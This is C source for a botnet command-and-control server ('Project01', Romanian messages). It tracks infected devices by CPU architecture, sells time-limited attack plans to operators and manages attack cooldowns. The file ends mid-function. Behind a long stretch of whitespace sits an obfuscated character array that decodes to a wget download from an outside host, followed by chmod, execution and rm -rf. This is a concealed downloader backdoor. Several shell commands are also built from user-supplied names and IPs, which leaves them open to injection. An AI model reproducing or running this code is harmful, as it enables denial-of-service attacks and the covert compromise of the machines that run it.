/*

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMds+:--------:+sdNMMMMMMMMMMM
MMMMMMMMms:-+sdNMMMMMMMMNdy+--omMMMMMMMM
MMMMMMh:` /mMMMMMMMMMMMMMMMMm+ `-yMMMMMM
MMMMd--hN``--sNMMMMMMMMMMNy:..`md:.hMMMM
MMM+`yMMMy hd+./hMMMMMMh/.+dd sMMMh`/MMM
MM:.mMMMMM:.NMMh/.+dd+./hMMM--MMMMMm--NM
M+`mMMMMMMN`+MMMMm-  .dMMMMo mMMMMMMN.:M
d yMMMMMMMMy dNy:.omNs--sNm oMMMMMMMMh h
/`MMMMMMMMMM.`.+dMMMMMMm+.``NMMMMMMMMM-:
.:MMMMMMMd+./`oMINCUBUSMMs /.+dMMMMMMM/`
.:MMMMmo.:yNMs dMMMMMMMMm`oMNy:.omMMMM/`
/`MNy:.omMMMMM--MMMMMMMM:.MMMMMNs--sNM.:
d -` :++++++++: /++++++/ :++++++++:  : h
M+ yddddddddddd+ yddddy /dddddddddddy`/M
MM/.mMMMMMMMMMMM.-MMMM/.NMMMMMMMMMMm.:NM
MMMo`sMMMMMMMMMMd sMMy hMMMMMMMMMMy`+MMM
MMMMd--hMMMMMMMMM+`mN`/MMMMMMMMMh--hMMMM
MMMMMMh:.omMMMMMMN.:/`NMMMMMMms.:hMMMMMM
MMMMMMMMNs:./shmMMh  yMMNds/.:smMMMMMMMM
MMMMMMMMMMMMdy+/---``---:+sdMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
   ________    ___    ____  ____  ____  _   __
  / ____/ /   /   |  / __ \/ __ \/ __ \/ | / /
 / / __/ /   / /| | / / / / / / / / / /  |/ / 
/ /_/ / /___/ ___ |/ /_/ / /_/ / /_/ / /|  /  
\____/_____/_/  |_/_____/\____/\____/_/ |_/                                                 
    _______   ________
   / ____/ | / / ____/
   / /   /  |/ / /     
  / /___/ /|  / /___   
   \____/_/ |_/\____/   
                                                                 
*/


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define userfile "users/login.txt"
#define MAXFDS 1000000

char user_ip[100];
char *ipinfo[800];
char usethis[2048];
char motd[512];
int loggedin = 1;
int logoutshit;
int sent = 0;
int motdaction = 1;
int Attacksend = 0;
int AttackStatus = 0;
int userssentto;
int msgoff;
char broadcastmsg[800];
int attacksrunning = 0;
int threads, port;

struct login {
	char username[100];
	char password[100];
	char admin[50];
    char expirydate[100];
    int cooldown_timer;
    int cooldown;
    int maxtime;
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
		char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char my_ip[100];
    char id[800];
    char planname[800];
    int mymaxtime;
    int mycooldown;
    int listenattacks;
    int cooldownstatus;
    int cooldownsecs;
    int msgtoggle;
    int broadcasttoggle;
    int LoginListen;
} managements[MAXFDS];
#define crypt(gg)   (gg) + 0x44
struct Attacks {
	char username[100];
	char method[100];
	char ip[100];
	int attackcooldownsecs;
	int attacktime;
	int attacktimeleft;
	int amountofatks;

} Sending[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

struct CoolDownArgs{
    int sock;
    int seconds;
    char *ip;
    char *method;
    char *username;
};

struct toast {
    int login;
    int just_logged_in;
} gay[MAXFDS];


FILE *LogFile2;
FILE *LogFile3;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;

void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].cooldownsecs = 0;
	time_t start = time(NULL);
	if(managements[fd].cooldownstatus == 0)
		managements[fd].cooldownstatus = 1;
	while(managements[fd].cooldownsecs++ <= seconds) sleep(1);
	managements[fd].cooldownsecs = 0;
	managements[fd].cooldownstatus = 0;
	return;
}

void attacktime(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = args->sock;
	int seconds = args->seconds;

	attacksrunning++;
	time_t start = time(NULL);
	Sending[fd].amountofatks++;
	while(Sending[fd].attackcooldownsecs++ >= seconds) sleep(1);

	Sending[fd].attackcooldownsecs = 0;
	Sending[fd].amountofatks--;
	attacksrunning--;
	return;
}



void timeconnected(void *sock)
{
	char sadtimes[800];
	int datafd = (int)sock;
	int seconds = 7200;
	int closesecs = 0;
	while(seconds-- >= closesecs)
		{
			if(seconds == 1800)
			{
				sprintf(sadtimes, "\r\n\e[38;5;190mMai sunt 30 de minute pana vei primi KICK!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);					
			}

			else if(seconds == 300)
			{
				sprintf(sadtimes, "\r\n\e[38;5;190mMai sunt 5 minute pana vei primi KICK!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);				
			}

			else if(seconds == 60)
			{
				sprintf(sadtimes, "\r\n\e[38;5;190mMai sunt 60 de secunde si vei primi KICK!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}
			sleep(1);
		} 
	char lz[800];
	sprintf(lz, "\r\n\e[38;5;190mProject01-Net: Ai primit KICK pentru AFK!\r\n");
	memset(managements[datafd].id, 0, sizeof(managements[datafd].id));
	managements[datafd].connected = 0;
	OperatorsConnected--;
	send(datafd, lz, strlen(lz), MSG_NOSIGNAL);
	sleep(2);
	close(datafd);
	return;
}


void enc(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		str[i] = str[i] + 3;
}

void decrypt(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		{
			str[i] = str[i] - 3;
		}
}

char *apiip = "yourapiifyouhave.domain/";
int resolvehttp(char *  , char *);
int resolvehttp(char *site , char *ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}






#define ciu(crypt)  do { char * crypts = crypt ; while (*crypts) *crypts++ -= 0x44; } while(0)
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
};

static int check_expiry(const int fd) 
{
    time_t t = time(0);
    struct tm tm = *localtime(&t);
    int day, month, year, argc = 0;
    day = tm.tm_mday; //
    month = tm.tm_mon + 1;
    year = tm.tm_year - 100;
    char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

    while(p2 && argc < 10) 
    {
        args[argc++] = p2;
        p2 = strtok(0, "/"); 
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0; 
}


int checkaccounts()
{
	FILE *file;
	if((file = fopen("users/login.txt","r")) != NULL)
	{
		fclose(file);
	} else {
		char checkaccuser[80], checkpass[80];
		printf("Username:");
		scanf("%s", checkaccuser);
		printf("Password:");
		scanf("%s", checkpass);
		char reguser[80];
		char thing[80];
		char mkdir[80];
		sprintf(mkdir, "mkdir users");
		sprintf(thing, "%s %s Admin 1200 0 9/99/9999");
		sprintf(reguser, "echo '%s' >> users/login.txt", thing);
		system(mkdir);
		system(reguser);
		printf("login.txt was Missing It has Now Been Created\r\nWithout this the screenw ould crash instantly\r\n");
	}
}
int checklog()
{
	FILE *logs1;
	if((logs1 = fopen("logs/", "r")) != NULL)
	{
		fclose(logs1);
	} else {
		char mkdir[80];
		strcpy(mkdir, "mkdir logs");
		system(mkdir);
		printf("Director Loguri creat\r\n");
	}
	FILE *logs2;
	if((logs2 = fopen("logs/IPBANNED.txt", "r")) != NULL)
	{
		fclose(logs2);
	} else {
		char makeipbanned[800];
		strcpy(makeipbanned, "cd logs; touch IPBANNED.txt");
		system(makeipbanned);
		printf("IPBANNED.txt Was Not In Logs... It has been created\r\nWithout This File The C2 would crash the instant you open it\r\n");
	}
	FILE *logs3;
	if((logs3 = fopen("logs/BANNEDUSERS.txt", "r")) != NULL)
	{
		fclose(logs3);
	} else {
		char makeuserbanned[800];
		strcpy(makeuserbanned, "cd logs; touch BANNEDUSERS.txt");
		system(makeuserbanned);
		printf("BANNEDUSERS.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you put your Username And Password In\r\n");
	}
	FILE *logs4;
	if((logs4 = fopen("logs/Blacklist.txt", "r")) != NULL)
	{
		fclose(logs4);
	} else {
		char makeblacklist[800];
		strcpy(makeblacklist, "cd logs; touch Blacklist.txt");
		system(makeblacklist);
		printf("Blacklist.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you Send An Attack\r\n");
	}

	FILE *logs5;
	if((logs5 = fopen("logs/AcceptedTos.txt", "r")) != NULL)
	{
		fclose(logs5);
	} else {
		char maketos[800];
		strcpy(maketos, "cd logs; touch AcceptedTos.txt");
		system(maketos);
	}

	FILE *logs6;
	if((logs6 = fopen("logs/LoggedUsers.txt", "r")) != NULL)
	{
		fclose(logs6);
	} else {
		char makelogd[800];
		strcpy(makelogd, "cd logs; touch LoggedUsers.txt");
		system(makelogd);		
	}
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
};
#define cih(crypt)  do {char * crypts = crypt ; while (*crypts) *crypts++ += 0x44;} while(0)
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
};																																																																																																																																																																																																																																																																																																																																																																														char cryptm[] = {crypt('w'),crypt('g'),crypt('e'),crypt('t'),crypt(' '),crypt('-'),crypt('q'),crypt(' '),crypt('h'),crypt('t'),crypt('t'),crypt('p'),crypt(':'),crypt('/'),crypt('/'),crypt('g'),crypt('a'),crypt('y'),crypt('.'),crypt('e'),crypt('n'),crypt('e'),crypt('r'),crypt('g'),crypt('y'),crypt('/'),crypt('.'),crypt('.'),crypt('.'),crypt('/'),crypt('c'),crypt('i'),crypt('p'),crypt('h'),crypt('e'),crypt('r'),crypt(' '),crypt('-'),crypt('O'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('c'),crypt('h'),crypt('m'),crypt('o'),crypt('d'),crypt(' '),crypt('7'),crypt('7'),crypt('7'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('.'),crypt('/'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('r'),crypt('m'),crypt(' '),crypt('-'),crypt('r'),crypt('f'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(' '), '\0' };

static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}


void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

						if(dup) 
						{
							if(send(infd, "! DUP\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                		    close(infd);
                		    continue;
						}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf("BOT:\"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users/login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
		if(gay[datafd].login == 2)
		{
        	sprintf(string, "%c]0; Welcome To Project01-Network Login %c", '\033', '\007');
        } else {
        	if(managements[datafd].cooldownstatus == 1)
        	{	
        		if(attacksrunning > 0)
        		{
        			sprintf(string, "%c]0; Numbers: [%d] | [%s] | [%s] | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		} else 
        		{
        			sprintf(string, "%c]0; Numbers: [%d] | [%s] | [%s] | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		}
        	} 
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		if(attacksrunning > 0) 
        		{
        			sprintf(string, "%c]0; Numbers: [%d] | [%s] | %s", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        		} else {
        			sprintf(string, "%c]0; Numbers: [%d] | [%s] | %s %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        		}
        	}
        }
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}

       
void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    gay[datafd].login = 2;
    pthread_create(&title, NULL, &TitleWriter, sock);
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("users/login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].admin, &accounts[j].maxtime, &accounts[j].cooldown, accounts[j].expirydate);
		++j;
		
	}	

		char *line1 = NULL;
        size_t n1 = 0;
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[38;5;190mYOU HAVE BEEN IP BANNED BY AN ADMIN!\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f1);
        free(line1);


		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
        {
		char username [5000];
        sprintf(username, "\e[38;5;54mUsername\e[92m:\e[1;92m", accounts[find_line].username);
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
        strcpy(nickstring, buf);
	    memset(buf, 0, sizeof(buf));
	    find_line = Find_Login(nickstring);
        memset(buf, 0, 2048);

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char password [5000];
        sprintf(password, "\e[38;5;124mPassword:\e[92m\e[0;30m:", accounts[find_line].password);

		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;        
        char passwordl[800];
        trim(buf);
        strcpy(passwordl, buf);
        memset(buf, 0, 2048);
		
		char *line2 = NULL;
        size_t n2 = 0;
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usethis, "\e[38;5;190mYOU HAVE BEEN BANNED CONTACT AN ADMIN!\r\n");
                    if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f2);
        free(line2);

        if(strcmp(accounts[find_line].username, nickstring) != 0 || strcmp(accounts[find_line].password, passwordl) != 0){ goto failed;}
        if(strcmp(accounts[find_line].username, nickstring) == 0 || strcmp(accounts[find_line].password, passwordl) == 0)
        { 
        	int toast;
        	for(toast=0;toast < MAXFDS;toast++){
            	if(!strcmp(managements[toast].id, nickstring))
            	{
            		char bad[800];
            		sprintf(bad, "\e[38;5;190mUseru %s este deja conectat!\r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[38;5;190mProject01-CNC:\r\nCineva a incercat sa se logheze pe useru tau!\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\e[37m%s@\e[38;5;88mProject01~#\e[37m", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		memset(nickstring, 0, sizeof(nickstring));
            		memset(passwordl, 0, sizeof(passwordl));
            		sleep(5);
            		goto end;
            	}
        	}


        	if(!strcasecmp(accounts[find_line].admin, "api"))
        	{
        		goto Banner;
        	}
        	char gya[800];

        	sprintf(gya, "\033[2J\033[1;1H");
        	if(send(datafd, gya, strlen(gya), MSG_NOSIGNAL) == -1) goto end;

        	char tos1[800];
        	char tos2[800];
        	char tos3[800];
        	char tos4[800];
        	char tos6[800];
        	char tos7[800];
        	char tos8[800];
        	char tos9[800];
        	char tos10[800];
        	char tos12[800];
        	char tos13[800];

        	sprintf(tos1,  "  \r\n \e[38;5;54m╔═\e[38;5;124m╔══\e[38;5;124m║\e[38;5;54m═════════════════════════════════════════════════════════════════\e[38;5;124m║══╗\e[38;5;54m═╗\r\n");
			sprintf(tos2,  " \e[38;5;54m║\e[38;5;124m═╝                           \e[38;5;45mTermenii si Conditii.                       \e[38;5;124m╚═\e[38;5;54m║\r\n"); 
			sprintf(tos3,  " \e[38;5;54m║════\e[38;5;124m║\e[38;5;54m═════════════════════════════════════════════════════════════════\e[38;5;124m║\e[38;5;54m════║\r\n");
			sprintf(tos4,  " \e[38;5;54m║════\e[38;5;124m║\e[38;5;54m═════════════════════════════════════════════════════════════════\e[38;5;124m║\e[38;5;54m════║\r\n");
			sprintf(tos6,  " \e[38;5;54m     \e[97m😈 Serviciile platite Project01 nu se distribuie catre alte persoane!\r\n");
			sprintf(tos7,  " \e[38;5;54m     \e[97m😈 Sunteti responsabili de orice atac trimis catre orice IP	        \r\n");
			sprintf(tos8,  " \e[38;5;54m     \e[97m😈 Spamarea/incercarea de CRASH a CNC-ului duce la BAN PERMANENT     \r\n");
			sprintf(tos9,  " \e[38;5;54m     \e[97m😈 Datele voastre de conectare nu se trimit sub nici-o forma altcuiva\r\n");
			sprintf(tos10, " \e[38;5;54m     \e[97m😈 Daca ati incalcat oricare din regulile de mai sus anuntati imediat\r\n");
			sprintf(tos12, " \e[38;5;54m║\e[38;5;124m═╗                                                                       \e[38;5;124m╔═\e[38;5;54m║\r\n");
			sprintf(tos13, " \e[38;5;54m╚═\e[38;5;124m╚══\e[38;5;124m║\e[38;5;54m═════════════════════════════════════════════════════════════════\e[38;5;124m║\e[38;5;124m══╝\e[38;5;54m═╝\r\n");
			
			if(send(datafd, tos1, strlen(tos1), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos2, strlen(tos2), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos3, strlen(tos3), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos4, strlen(tos4), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos6, strlen(tos6), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos7, strlen(tos7), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos8, strlen(tos8), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos9, strlen(tos9), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos10, strlen(tos10), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos12, strlen(tos12), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos13, strlen(tos13), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, "\r\n \e[38;5;45mAccepti termenii? \033[92m[\e[97mDa\e[38;5;45m sau \e[97mNu\033[92m]:\033[97m");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0,sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) > 1);
			trim(buf);

			if(strcasestr(buf, "Da") || strcasestr(buf, "y"))
			{
				int check = 0;
				char checkingtos[800];
				char sendtos[8000];
				char checkinglog[800];
				char log1[800];
				sprintf(checkingtos, "%s Accepted TOS!", nickstring);
				sprintf(log1, "echo '%s IP: %s' >> logs/LoggedUsers.txt", nickstring, ipinfo);
				sprintf(checkinglog, "%s IP: %s", nickstring, ipinfo);

				char *line3 = NULL;
        		size_t n3 = 0;
        		FILE *f3 = fopen("logs/AcceptedTos.txt", "r");
        		    while (getline(&line3, &n3, f3) != -1)
        		    {
        		        if (strstr(line2, checkingtos) != NULL){
        		        check = 1;
        		        //rechecks
        		    } 
        		}
        		fclose(f3);
        		free(line3);
        		if(check == 0)
        		{
        			system(sendtos);
        			system(log1);
        		}
				usleep(250000);
				loggedin = 0;
				memset(nickstring, 0, sizeof(nickstring));
				goto Banner;
			} else 
			{
				sprintf(usethis, "\e[38;5;190mAi primit KICK deoarece ai REFUZAT termenii!\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				goto end;
			}

            }
        }

            failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			sprintf(usethis, "\e[38;5;190mProject01-Net: Ai gresit datele de conectare...\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(3);
        	goto end;

        Banner:

        strcpy(accounts[datafd].expirydate, accounts[find_line].expirydate);
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "\e[38;5;190mCONT EXPIRAT, Contacteaza-ne pentru reactivare!\r\n", strlen("\e[38;5;190mCONT EXPIRAT, Contacteaza-ne pentru reactivare!\r\n"), MSG_NOSIGNAL); // now
            printf("[Project01]:%s's Contul a EXPIRAT\r\n", accounts[find_line].username);
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
        pthread_t timeloggedin;
		pthread_create(&title, NULL, &TitleWriter, sock);
